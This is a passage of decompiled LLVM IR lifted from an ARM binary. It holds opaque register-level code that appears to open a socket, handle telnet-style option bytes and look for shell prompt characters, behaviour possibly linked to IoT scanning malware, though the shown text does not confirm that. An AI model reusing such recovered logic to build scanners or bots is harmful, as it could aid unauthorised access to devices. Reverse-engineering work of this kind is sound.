  %.348 = zext i1 %v7_11e1c to i32
  store i32 %.348, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11e28 = icmp eq i32 %v0_11e18, 0
  store i1 %v2_11e28, i1* %cpsr_z.global-to-local, align 1
  %tmp335 = icmp slt i32 %v0_11e18, 1
  br i1 %tmp335, label %bb336, label %.thread68

.thread68:                                        ; preds = %dec_label_pc_11df4
  store i32 1, i32* %sl.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11e80

bb336:                                            ; preds = %dec_label_pc_11df4
  store i32 %.348, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11e34 = icmp eq i1 %v7_11e1c, false
  store i1 %v2_11e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e34, label %dec_label_pc_11e3c, label %dec_label_pc_11e80

dec_label_pc_11e3c:                               ; preds = %bb336
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11e48 = call i32 @function_13f50(i32 2, i32 1, i32 0)
  store i32 %v3_11e48, i32* %r0.global-to-local, align 4
  %v2_11e4c = icmp eq i32 %v3_11e48, -1
  store i1 %v2_11e4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11e4c = icmp eq i32 %v3_11e48, -1
  store i1 %v7_11e4c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_11e48, i32* @r6, align 4
  br i1 %v7_11e4c, label %dec_label_pc_12280, label %dec_label_pc_11e58

dec_label_pc_11e58:                               ; preds = %dec_label_pc_11e3c
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_11e5c = call i32 @function_1236c(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_11e64 = call i32 @function_1236c(i32 19)
  %v0_11e68 = load i32, i32* @sl, align 4
  store i32 %v0_11e68, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_11e70 = inttoptr i32 %v0_11e68 to i32*
  %v3_11e70 = call i32 @function_12288(i32 18, i32* %v2_11e70)
  store i32 %v3_11e70, i32* %r0.global-to-local, align 4
  %v1_11e74 = inttoptr i32 %v3_11e70 to i8*
  %v2_11e74 = call i32 @function_10144(i8* %v1_11e74)
  store i32 %v2_11e74, i32* %r0.global-to-local, align 4
  store i32 %v2_11e74, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_11e78 = icmp eq i32 %v2_11e74, 0
  store i1 %v3_11e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e78, label %dec_label_pc_11e80, label %dec_label_pc_12150

dec_label_pc_11e80:                               ; preds = %.thread68, %dec_label_pc_11e58, %bb336
  %v0_11e80 = load i32, i32* @r5, align 4
  %v1_11e80 = add i32 %v0_11e80, 4
  %v2_11e80 = inttoptr i32 %v1_11e80 to i32*
  %v3_11e80 = load i32, i32* %v2_11e80, align 4
  store i32 %v3_11e80, i32* %r0.global-to-local, align 4
  %v1_11e84 = call i32 @function_13654(i32 %v3_11e80)
  store i32 %v1_11e84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_11e90 = load i32, i32* @r5, align 4
  %v1_11e90 = add i32 %v0_11e90, 24
  %v2_11e90 = inttoptr i32 %v1_11e90 to i32*
  %v3_11e90 = load i32, i32* %v2_11e90, align 4
  store i32 %v3_11e90, i32* %ip.global-to-local, align 4
  %v2_11e94 = add i32 %v0_11e90, 4
  %v3_11e94 = inttoptr i32 %v2_11e94 to i32*
  store i32 -1, i32* %v3_11e94, align 4
  %v0_11e98 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e98 = load i32, i32* @r5, align 4
  %v2_11e98 = add i32 %v1_11e98, 12
  %v3_11e98 = inttoptr i32 %v2_11e98 to i32*
  store i32 %v0_11e98, i32* %v3_11e98, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11e9c:                               ; preds = %.thread204, %dec_label_pc_11f1c, %dec_label_pc_120ec, %dec_label_pc_12004, %dec_label_pc_11d10, %dec_label_pc_11c5c, %dec_label_pc_11ba8, %dec_label_pc_11af4, %dec_label_pc_11a5c, %dec_label_pc_118cc, %dec_label_pc_11868, %dec_label_pc_11e80
  %v0_11e9c = load i32, i32* %ip.global-to-local, align 4
  %v1_11e9c = load i32, i32* @r7, align 4
  %v2_11e9c = sub i32 %v0_11e9c, %v1_11e9c
  %v3_11e9c = icmp uge i32 %v0_11e9c, %v1_11e9c
  store i1 %v3_11e9c, i1* %cpsr_c.global-to-local, align 1
  %v4_11e9c = xor i32 %v1_11e9c, %v0_11e9c
  %v5_11e9c = xor i32 %v2_11e9c, %v0_11e9c
  %v6_11e9c = and i32 %v5_11e9c, %v4_11e9c
  %v7_11e9c = icmp slt i32 %v6_11e9c, 0
  %v8_11e9c = icmp slt i32 %v2_11e9c, 0
  %v9_11e9c = icmp eq i32 %v0_11e9c, %v1_11e9c
  store i1 %v9_11e9c, i1* %cpsr_z.global-to-local, align 1
  %v2_11ea0 = xor i1 %v8_11e9c, %v7_11e9c
  %v0_11e9c.v1_11e9c = select i1 %v2_11ea0, i32 %v0_11e9c, i32 %v1_11e9c
  store i32 %v0_11e9c.v1_11e9c, i32* %r1.global-to-local, align 4
  %v2_11ea8 = sub i32 %v0_11e9c, %v0_11e9c.v1_11e9c
  store i32 %v2_11ea8, i32* @r2, align 4
  %v1_11eac = load i32, i32* @r5, align 4
  %v2_11eac = add i32 %v1_11eac, 24
  %v3_11eac = inttoptr i32 %v2_11eac to i32*
  store i32 %v2_11ea8, i32* %v3_11eac, align 4
  %v0_11eb0 = load i32, i32* @sb, align 4
  %v1_11eb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11eb0 = add i32 %v1_11eb0, %v0_11eb0
  store i32 %v2_11eb0, i32* @r1, align 4
  store i32 %v0_11eb0, i32* @r0, align 4
  %v3_11eb8 = call i32 @function_13c80(i32 %v0_11eb0, i32 %v2_11eb0, i32 %v2_11ea8)
  store i32 %v3_11eb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11750

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11750
  %v1_11ec0 = add i32 %v0_11750, 24
  %v2_11ec0 = inttoptr i32 %v1_11ec0 to i32*
  %v3_11ec0 = load i32, i32* %v2_11ec0, align 4
  store i32 %v3_11ec0, i32* %ip.global-to-local, align 4
  %v1_11ec4 = add i32 %v3_11ec0, -1
  store i32 %v1_11ec4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11ec8 = icmp eq i32 %v1_11ec4, 0
  store i1 %v2_11ec8, i1* %cpsr_z.global-to-local, align 1
  %v5_11ecc = icmp sgt i32 %v1_11ec4, 0
  br i1 %v5_11ecc, label %dec_label_pc_11ef4, label %dec_label_pc_116d0thread-pre-split.thread

dec_label_pc_11ed4:                               ; preds = %bb339
  %v2_11ed4 = icmp ugt i8 %v3_11ef8, 35
  store i1 %v2_11ed4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ed4 = icmp eq i8 %v3_11ef8, 36
  store i1 %v7_11ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ed4, label %dec_label_pc_11f08, label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11ed4
  %v2_11edc = icmp ugt i8 %v3_11ef8, 34
  store i1 %v2_11edc, i1* %cpsr_c.global-to-local, align 1
  %v7_11edc = icmp eq i8 %v3_11ef8, 35
  store i1 %v7_11edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11edc, label %dec_label_pc_11f08, label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11edc
  %v2_11ee4 = icmp ugt i8 %v3_11ef8, 36
  store i1 %v2_11ee4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ee4 = icmp eq i8 %v3_11ef8, 37
  store i1 %v7_11ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ee4, label %dec_label_pc_11f08, label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11ee4
  %v1_11eec = add i32 %v0_11f08, -1
  store i32 %v1_11eec, i32* %r0.global-to-local, align 4
  %v2_11eec = icmp ne i32 %v0_11f08, 0
  store i1 %v2_11eec, i1* %cpsr_c.global-to-local, align 1
  %v7_11eec = icmp eq i32 %v0_11f08, 1
  store i1 %v7_11eec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11eec, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11ec0, %dec_label_pc_11eec
  %v0_11f08 = phi i32 [ %v1_11eec, %dec_label_pc_11eec ], [ %v1_11ec4, %dec_label_pc_11ec0 ]
  %v2_11ef4 = add i32 %v0_11f08, %v0_11750
  store i32 %v2_11ef4, i32* %r3.global-to-local, align 4
  %v1_11ef8 = add i32 %v2_11ef4, 28
  %v2_11ef8 = inttoptr i32 %v1_11ef8 to i8*
  %v3_11ef8 = load i8, i8* %v2_11ef8, align 1
  %v4_11ef8 = zext i8 %v3_11ef8 to i32
  store i32 %v4_11ef8, i32* %r3.global-to-local, align 4
  %v2_11efc = icmp ugt i8 %v3_11ef8, 61
  store i1 %v2_11efc, i1* %cpsr_c.global-to-local, align 1
  %v7_11efc = icmp eq i8 %v3_11ef8, 62
  store i1 %v7_11efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11efc, label %dec_label_pc_11f08, label %bb339

bb339:                                            ; preds = %dec_label_pc_11ef4
  %v3_11f00 = icmp ugt i8 %v3_11ef8, 57
  store i1 %v3_11f00, i1* %cpsr_c.global-to-local, align 1
  %v8_11f00 = icmp eq i8 %v3_11ef8, 58
  store i1 %v8_11f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11f00, label %dec_label_pc_11f08, label %dec_label_pc_11ed4

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11ef4, %bb339, %dec_label_pc_11ee4, %dec_label_pc_11edc, %dec_label_pc_11ed4
  %v1_11f08 = add i32 %v0_11f08, 1
  store i32 %v1_11f08, i32* @r7, align 4
  %v2_11f0c = icmp eq i32 %v1_11f08, -1
  store i1 %v2_11f0c, i1* %cpsr_c.global-to-local, align 1
  %v7_11f0c = icmp eq i32 %v0_11f08, -2
  store i1 %v7_11f0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f0c, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11f14

dec_label_pc_11f14:                               ; preds = %dec_label_pc_11f08
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11f14 = icmp eq i32 %v1_11f08, 0
  store i1 %v2_11f14, i1* %cpsr_z.global-to-local, align 1
  %tmp340 = icmp slt i32 %v1_11f08, 1
  br i1 %tmp340, label %dec_label_pc_11860, label %dec_label_pc_11f1c

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11f14
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11f20 = call i32 @function_1236c(i32 24)
  store i32 %v2_11b00, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_11f30 = call i32 @function_12288(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_11f30, i32* %r0.global-to-local, align 4
  %v3_11f34 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11f34, i32* %r2.global-to-local, align 4
  store i32 %v3_11f30, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11f40 = load i32, i32* @r5, align 4
  %v1_11f40 = add i32 %v0_11f40, 4
  %v2_11f40 = inttoptr i32 %v1_11f40 to i32*
  %v3_11f40 = load i32, i32* %v2_11f40, align 4
  store i32 %v3_11f40, i32* %r0.global-to-local, align 4
  %v4_11f44 = inttoptr i32 %v3_11f30 to i32*
  %v5_11f44 = call i32 @function_13ec0(i32 %v3_11f40, i32* %v4_11f44, i32 %v3_11f34, i32 16384)
  store i32 %v5_11f44, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11f54 = load i32, i32* @r5, align 4
  %v1_11f54 = add i32 %v0_11f54, 4
  %v2_11f54 = inttoptr i32 %v1_11f54 to i32*
  %v3_11f54 = load i32, i32* %v2_11f54, align 4
  store i32 %v3_11f54, i32* %r0.global-to-local, align 4
  %v5_11f58 = call i32 @function_13ec0(i32 %v3_11f54, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11f60 = call i32 @function_122b4(i32 24)
  store i32 %v1_11f60, i32* %r0.global-to-local, align 4
  %v0_11f64 = load i32, i32* @r5, align 4
  %v1_11f64 = add i32 %v0_11f64, 24
  %v2_11f64 = inttoptr i32 %v1_11f64 to i32*
  %v3_11f64 = load i32, i32* %v2_11f64, align 4
  store i32 %v3_11f64, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_11f6c = add i32 %v0_11f64, 12
  %v3_11f6c = inttoptr i32 %v2_11f6c to i32*
  store i32 10, i32* %v3_11f6c, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11f74:                               ; preds = %dec_label_pc_117e0
  store i32 ptrtoint (i32* @global_var_161c9.330 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_11798, i32* @r0, align 4
  %v3_11f80 = call i32 @function_13c70(i32 %v2_11798, i32 ptrtoint (i32* @global_var_161c9.330 to i32), i32 3)
  store i32 9, i32* @r2, align 4
  store i32 %v2_11f8c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_161c0.332 to i32), i32* @r1, align 4
  %v3_11f94 = call i32 @function_13c70(i32 %v2_11f8c, i32 ptrtoint (i32* @global_var_161c0.332 to i32), i32 9)
  store i32 %v3_11f94, i32* %r0.global-to-local, align 4
  %v0_11f98 = load i32, i32* @r5, align 4
  %v1_11f98 = add i32 %v0_11f98, 24
  %v2_11f98 = inttoptr i32 %v1_11f98 to i32*
  %v3_11f98 = load i32, i32* %v2_11f98, align 4
  store i32 %v3_11f98, i32* %ip.global-to-local, align 4
  %v0_11f9c = load i32, i32* @r6, align 4
  %v1_11f9c = add i32 %v0_11f9c, 2
  store i32 %v1_11f9c, i32* %r2.global-to-local, align 4
  %v0_11fa0 = load i32, i32* @sb, align 4
  %v2_11fa0 = add i32 %v0_11fa0, %v3_11f98
  store i32 %v2_11fa0, i32* %r3.global-to-local, align 4
  %v3_11fa4 = icmp uge i32 %v2_11fa0, %v1_11f9c
  store i1 %v3_11fa4, i1* %cpsr_c.global-to-local, align 1
  %v9_11fa4 = icmp eq i32 %v2_11fa0, %v1_11f9c
  store i1 %v9_11fa4, i1* %cpsr_z.global-to-local, align 1
  %v2_11fa8 = xor i1 %v3_11fa4, true
  %v3_11fa8 = or i1 %v9_11fa4, %v2_11fa8
  br i1 %v3_11fa8, label %dec_label_pc_11f74.dec_label_pc_11850.loopexit_crit_edge, label %dec_label_pc_11fac

dec_label_pc_11f74.dec_label_pc_11850.loopexit_crit_edge: ; preds = %dec_label_pc_11f74
  %v0_11850.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11850

dec_label_pc_11fac:                               ; preds = %dec_label_pc_11f74
  %v0_11fac = load i32, i32* @r4, align 4
  %v1_11fac = add i32 %v0_11fac, 1
  %v2_11fac = inttoptr i32 %v1_11fac to i8*
  %v3_11fac = load i8, i8* %v2_11fac, align 1
  %v4_11fac = zext i8 %v3_11fac to i32
  store i32 %v4_11fac, i32* %r3.global-to-local, align 4
  %v2_11fb0 = icmp ugt i8 %v3_11fac, 30
  store i1 %v2_11fb0, i1* %cpsr_c.global-to-local, align 1
  %v7_11fb0 = icmp eq i8 %v3_11fac, 31
  store i1 %v7_11fb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11fb0, label %dec_label_pc_120a0, label %dec_label_pc_11fb8

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_11fac
  %v1_11fb8 = add i32 %v0_11fac, -1
  %v2_11fb8 = inttoptr i32 %v1_11fb8 to i8*
  %v3_11fb8 = load i8, i8* %v2_11fb8, align 1
  %v4_11fb8 = zext i8 %v3_11fb8 to i32
  store i32 %v4_11fb8, i32* %r3.global-to-local, align 4
  %v2_11fbc = icmp ugt i8 %v3_11fb8, -4
  store i1 %v2_11fbc, i1* %cpsr_c.global-to-local, align 1
  %v7_11fbc = icmp eq i8 %v3_11fb8, -3
  store i1 %v7_11fbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11fbc, label %bb341, label %dec_label_pc_11fc8

bb341:                                            ; preds = %dec_label_pc_11fb8
  %v1_11fc0 = load i32, i32* @r8, align 4
  %v2_11fc0 = trunc i32 %v1_11fc0 to i8
  store i8 %v2_11fc0, i8* %v2_11fb8, align 1
  %v0_11fc4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11fc4.pr, label %dec_label_pc_117f4, label %.dec_label_pc_11fc8_crit_edge

.dec_label_pc_11fc8_crit_edge:                    ; preds = %bb341
  %v0_11fc8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %.dec_label_pc_11fc8_crit_edge, %dec_label_pc_11fb8
  %v0_11fc8 = phi i32 [ %v0_11fc8.pre, %.dec_label_pc_11fc8_crit_edge ], [ %v4_11fb8, %dec_label_pc_11fb8 ]
  %v2_11fc8 = icmp ugt i32 %v0_11fc8, 250
  store i1 %v2_11fc8, i1* %cpsr_c.global-to-local, align 1
  %v7_11fc8 = icmp eq i32 %v0_11fc8, 251
  store i1 %v7_11fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11fc8, label %bb342, label %dec_label_pc_117f4

bb342:                                            ; preds = %dec_label_pc_11fc8
  %v1_11fcc = load i32, i32* %sl.global-to-local, align 4
  %v2_11fcc = trunc i32 %v1_11fcc to i8
  %v3_11fcc = load i32, i32* @r4, align 4
  %v4_11fcc = add i32 %v3_11fcc, -1
  %v5_11fcc = inttoptr i32 %v4_11fcc to i8*
  store i8 %v2_11fcc, i8* %v5_11fcc, align 1
  br label %dec_label_pc_117f4

dec_label_pc_11fd4:                               ; preds = %dec_label_pc_11d68
  store i32 %v1_11da4, i32* %r0.global-to-local, align 4
  %v0_11fdc = load i32, i32* @r5, align 4
  %v1_11fdc = add i32 %v0_11fdc, 4
  %v2_11fdc = inttoptr i32 %v1_11fdc to i32*
  %v3_11fdc = load i32, i32* %v2_11fdc, align 4
  store i32 %v3_11fdc, i32* %r0.global-to-local, align 4
  %v1_11fe0 = call i32 @function_13654(i32 %v3_11fdc)
  store i32 %v1_11fe0, i32* %r0.global-to-local, align 4
  %v0_11fe4 = load i32, i32* @r5, align 4
  %v1_11fe4 = add i32 %v0_11fe4, 284
  %v2_11fe4 = inttoptr i32 %v1_11fe4 to i8*
  %v3_11fe4 = load i8, i8* %v2_11fe4, align 1
  %v4_11fe4 = zext i8 %v3_11fe4 to i32
  %v1_11fe8 = add nuw nsw i32 %v4_11fe4, 1
  %v1_11fec = urem i32 %v1_11fe8, 256
  store i32 %v1_11fec, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_11ff4 = icmp ugt i32 %v1_11fec, 9
  store i1 %v2_11ff4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ff4 = icmp eq i32 %v1_11fec, 10
  store i1 %v7_11ff4, i1* %cpsr_z.global-to-local, align 1
  %v2_11ff8 = add i32 %v0_11fe4, 4
  %v3_11ff8 = inttoptr i32 %v2_11ff8 to i32*
  store i32 -1, i32* %v3_11ff8, align 4
  %v0_11ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_11ffc = trunc i32 %v0_11ffc to i8
  %v2_11ffc = load i32, i32* @r5, align 4
  %v3_11ffc = add i32 %v2_11ffc, 284
  %v4_11ffc = inttoptr i32 %v3_11ffc to i8*
  store i8 %v1_11ffc, i8* %v4_11ffc, align 1
  %v0_12000 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12004 = load i32, i32* @r5, align 4
  br i1 %v0_12000, label %dec_label_pc_12004, label %dec_label_pc_120ec

dec_label_pc_12004:                               ; preds = %dec_label_pc_11fd4
  %v1_12004 = add i32 %v0_12004, 24
  %v2_12004 = inttoptr i32 %v1_12004 to i32*
  %v3_12004 = load i32, i32* %v2_12004, align 4
  store i32 %v3_12004, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v3_12014 = add i32 %v0_12004, 284
  %v4_12014 = inttoptr i32 %v3_12014 to i8*
  store i8 0, i8* %v4_12014, align 1
  %v0_12018 = load i32, i32* %r1.global-to-local, align 4
  %v1_12018 = load i32, i32* @r5, align 4
  %v2_12018 = add i32 %v1_12018, 12
  %v3_12018 = inttoptr i32 %v2_12018 to i32*
  store i32 %v0_12018, i32* %v3_12018, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_12020:                               ; preds = %dec_label_pc_116e8
  br i1 %v2_11710, label %dec_label_pc_12140, label %dec_label_pc_12024

dec_label_pc_12024:                               ; preds = %dec_label_pc_12020
  %v3_12024 = icmp eq i32 %v5_1170c, -1
  store i1 %v3_12024, i1* %cpsr_c.global-to-local, align 1
  %v8_12024 = icmp eq i32 %v5_1170c, -1
  store i1 %v8_12024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12024, label %dec_label_pc_1202c, label %dec_label_pc_11738

dec_label_pc_1202c:                               ; preds = %dec_label_pc_12024
  store i32 %stack_var_-1868.0, i32* %r2.global-to-local, align 4
  %v2_12030 = load i32, i32* %v2_116f0, align 4
  store i32 %v2_12030, i32* %r3.global-to-local, align 4
  %v2_12034 = icmp ugt i32 %v2_12030, 10
  store i1 %v2_12034, i1* %cpsr_c.global-to-local, align 1
  %v7_12034 = icmp eq i32 %v2_12030, 11
  store i1 %v7_12034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12034, label %dec_label_pc_11568, label %dec_label_pc_1203c

dec_label_pc_1203c:                               ; preds = %dec_label_pc_1202c, %dec_label_pc_12140
  %v0_1203c = load i32, i32* @r5, align 4
  %v1_1203c = add i32 %v0_1203c, 4
  %v2_1203c = inttoptr i32 %v1_1203c to i32*
  %v3_1203c = load i32, i32* %v2_1203c, align 4
  store i32 %v3_1203c, i32* %r0.global-to-local, align 4
  %v1_12040 = call i32 @function_13654(i32 %v3_1203c)
  store i32 %v1_12040, i32* %r0.global-to-local, align 4
  %v0_12044 = load i32, i32* @r5, align 4
  %v1_12044 = add i32 %v0_12044, 284
  %v2_12044 = inttoptr i32 %v1_12044 to i8*
  %v3_12044 = load i8, i8* %v2_12044, align 1
  %v4_12044 = zext i8 %v3_12044 to i32
  %v1_12048 = add nuw nsw i32 %v4_12044, 1
  %v1_1204c = urem i32 %v1_12048, 256
  store i32 %v1_1204c, i32* %r3.global-to-local, align 4
  %v2_12050 = icmp ugt i32 %v1_1204c, 8
  store i1 %v2_12050, i1* %cpsr_c.global-to-local, align 1
  %v7_12050 = icmp eq i32 %v1_1204c, 9
  store i1 %v7_12050, i1* %cpsr_z.global-to-local, align 1
  %v1_12054 = trunc i32 %v1_12048 to i8
  store i8 %v1_12054, i8* %v2_12044, align 1
  store i32 -1, i32* @r4, align 4
  %v0_1205c = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1205c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_1205c = xor i1 %v1_1205c, true
  %v3_1205c = and i1 %v0_1205c, %v2_1205c
  br i1 %v3_1205c, label %bb343, label %.thread217

.thread217:                                       ; preds = %dec_label_pc_1203c
  %v1_12060213218 = load i32, i32* @r5, align 4
  %v2_12060214219 = add i32 %v1_12060213218, 4
  %v3_12060215220 = inttoptr i32 %v2_12060214219 to i32*
  store i32 -1, i32* %v3_12060215220, align 4
  br label %bb344

bb343:                                            ; preds = %dec_label_pc_1203c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12060209 = load i32, i32* @r5, align 4
  %v2_12060210 = add i32 %v1_12060209, 4
  %v3_12060211 = inttoptr i32 %v2_12060210 to i32*
  store i32 -1, i32* %v3_12060211, align 4
  %v4_12064 = load i32, i32* %r3.global-to-local, align 4
  %v5_12064 = load i32, i32* @r5, align 4
  %v6_12064 = add i32 %v5_12064, 12
  %v7_12064 = inttoptr i32 %v6_12064 to i32*
  store i32 %v4_12064, i32* %v7_12064, align 4
  %v4_12068 = load i32, i32* %r3.global-to-local, align 4
  %v5_12068 = trunc i32 %v4_12068 to i8
  %v6_12068 = load i32, i32* @r5, align 4
  %v7_12068 = add i32 %v6_12068, 284
  %v8_12068 = inttoptr i32 %v7_12068 to i8*
  store i8 %v5_12068, i8* %v8_12068, align 1
  %v0_1206c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1206c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb344

bb344:                                            ; preds = %.thread217, %bb343
  %v1_1206c = phi i1 [ %v1_1206c.pre, %bb343 ], [ %v1_1205c, %.thread217 ]
  %v0_1206c = phi i1 [ %v0_1206c.pre, %bb343 ], [ %v0_1205c, %.thread217 ]
  %v2_1206c = xor i1 %v1_1206c, true
  %v3_1206c = and i1 %v0_1206c, %v2_1206c
  br i1 %v3_1206c, label %dec_label_pc_11568, label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %bb344
  %v0_12070 = load i32, i32* @r5, align 4
  store i32 %v0_12070, i32* @r0, align 4
  %v0_12074 = call i32 @function_106a4()
  store i32 %v0_12074, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11568

dec_label_pc_1207c:                               ; preds = %dec_label_pc_11a2c, %dec_label_pc_11a08, %dec_label_pc_11a48
  store i32 %v3_11a08, i32* %r1.global-to-local, align 4
  %v0_12080 = load i32, i32* @sb, align 4
  store i32 %v0_12080, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1615c.334 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_1208c = call i32 @function_12d58(i32 %v0_12080, i32 %v3_11a08, i32 ptrtoint ([8 x i8]* @global_var_1615c.334 to i32), i32 7)
  store i32 %v5_1208c, i32* %r0.global-to-local, align 4
  %v3_12090 = icmp eq i32 %v5_1208c, -1
  store i1 %v3_12090, i1* %cpsr_c.global-to-local, align 1
  %v8_12090 = icmp eq i32 %v5_1208c, -1
  store i1 %v8_12090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1208c, i32* @r7, align 4
  br i1 %v3_12090, label %dec_label_pc_116cc.loopexit, label %dec_label_pc_11a54

dec_label_pc_120a0:                               ; preds = %dec_label_pc_11fac
  store i32 %v2_11798, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_120ac = add i32 %v0_11f98, 4
  %v2_120ac = inttoptr i32 %v1_120ac to i32*
  %v3_120ac = load i32, i32* %v2_120ac, align 4
  store i32 %v3_120ac, i32* %r0.global-to-local, align 4
  %v5_120b0 = call i32 @function_13ec0(i32 %v3_120ac, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_120b0, i32* %r0.global-to-local, align 4
  store i32 %v2_11f84, i32* %r1.global-to-local, align 4
  %v0_120b8 = load i32, i32* @r5, align 4
  %v1_120b8 = add i32 %v0_120b8, 4
  %v2_120b8 = inttoptr i32 %v1_120b8 to i32*
  %v3_120b8 = load i32, i32* %v2_120b8, align 4
  store i32 %v3_120b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11830

dec_label_pc_120c8:                               ; preds = %dec_label_pc_116d8
  store i32 %.pre, i32* @r0, align 4
  %v1_120d0 = add i32 %v0_120c8, 92
  store i32 %v1_120d0, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_120d8 = call i32 @function_13c80(i32 %.pre, i32 %v1_120d0, i32 192)
  store i32 %v3_120d8, i32* %r0.global-to-local, align 4
  %v0_120dc = load i32, i32* @r5, align 4
  %v1_120dc = add i32 %v0_120dc, 24
  %v2_120dc = inttoptr i32 %v1_120dc to i32*
  %v3_120dc = load i32, i32* %v2_120dc, align 4
  store i32 %v3_120dc, i32* %r3.global-to-local, align 4
  %v1_120e0 = add i32 %v3_120dc, -64
  store i32 %v1_120e0, i32* %ip.global-to-local, align 4
  store i32 %v1_120e0, i32* %v2_120dc, align 4
  br label %dec_label_pc_116e8

dec_label_pc_120ec:                               ; preds = %dec_label_pc_11fd4
  store i32 %v0_12004, i32* @r0, align 4
  %v0_120f0 = call i32 @function_106a4()
  store i32 %v0_120f0, i32* %r0.global-to-local, align 4
  %v0_120f4 = load i32, i32* @r5, align 4
  %v1_120f4 = add i32 %v0_120f4, 24
  %v2_120f4 = inttoptr i32 %v1_120f4 to i32*
  %v3_120f4 = load i32, i32* %v2_120f4, align 4
  store i32 %v3_120f4, i32* %ip.global-to-local, align 4
  %v0_120f8 = load i32, i32* @r4, align 4
  store i32 %v0_120f8, i32* @r7, align 4
  br label %dec_label_pc_11e9c

